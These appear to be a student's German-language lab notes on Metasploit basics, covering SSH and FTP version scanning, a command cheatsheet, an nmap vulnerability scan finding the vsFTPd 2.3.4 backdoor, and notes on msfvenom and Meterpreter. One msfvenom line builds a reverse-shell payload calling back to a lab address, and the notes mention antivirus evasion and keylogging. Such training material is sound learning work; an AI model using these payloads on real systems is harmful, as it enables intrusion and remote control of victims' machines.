### Gemeinsame Übung (Kali)
```
$ msfconsole
```
Beispiel: Die Module SSH Version und http Title.
#### SSH Version:
```
search -h
search ssh
search scanner/ssh
```
search durchsucht die Metasploit-Moduldatenbank.
Man kann nach Modultypen filtern.
```
search type:auxiliary name:ssh
info auxiliary/scanner/ssh/ssh_version
```
Zeigt:
- Beschreibung des Moduls
- Benötigte Optionen
```
use auxiliary/scanner/ssh/ssh_version
```
Aktiviert ein Modul und wechselt in dessen Kontext.
```
options
```
Zeigt alle konfigurierbaren Parameter, z. B.:
- RHOSTS → Ziel-IP
- RPORT → Ziel-Port
```
set RHOSTS <target IP>
run
```
Setzt eine Option nur für das aktuelle Modul.

### Übung (msf Basics)
Probiere alle besprochenen bzw. open beschriebenen msf Befehle noch einmal aus und erstelle ein kurzes Cheatsheet zur Bedienung von metasploit.

#### Cheatsheet

| Befehl           | Erklärung            |
| ---------------- | -------------------- |
| `msfconsole`     | Startet Metasploit   |
| `help`           | Hilfe anzeigen       |
| `search`         | Module suchen        |
| `use`            | Modul aktivieren     |
| `info`           | Modulbeschreibung    |
| `options`        | Moduloptionen        |
| `set`            | Option lokal setzen  |
| `setg`           | Option global setzen |
| `show exploits`  | Exploit-Module       |
| `show auxiliary` | Scanner/Hilfsmodule  |
| `run / exploit`  | Modul starten        |
| `back`           | Modul verlassen      |
| `exit`           | Metasploit beenden   |

--- 

Der Befehl setg (set global) ist in unserem Zusammenhang auch sehr praktisch, recherchiere dazu.

Recherchiere zu
- msfvenom
  msfvenom ist ein Tool zur:
  - Erstellung von Payloads
  - Kodierung von Shellcode
  - Umgehung von Antivirus-Software

  Beispiel:
  `msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.56.1 LPORT=4444 -f elf > shell.elf`

  Wird oft für eigene Exploits verwendet.

- Meterpreter
  Meterpreter ist ein erweiterter Payload mit:
  - Interaktiver Shell
  - Datei-Upload/Download
  - Keylogging
  - Screenshot
    
  Privilege Escalation
  Wird nach erfolgreichem Exploit genutzt (Post-Exploitation).

### Übung (nmap FTP scan)
Befehl:
`nmap -p 21 --script=vuln 192.168.56.101`

Erklärung:
- -p 21 → nur FTP Port
- --script=vuln → Sicherheitslücken-Skripte

Ergebnis:
Nmap erkennt:
- vsFTPd 2.3.4 Backdoor
- CVE-2011-2523

### Übung (msf FTP Version herausfinden)
Modul suchen:
`search ftp version`

Modul verwenden:
```
use auxiliary/scanner/ftp/ftp_version
set RHOSTS 192.168.95.129
run
```
Ergebnis:
`vsFTPd 2.3.4`
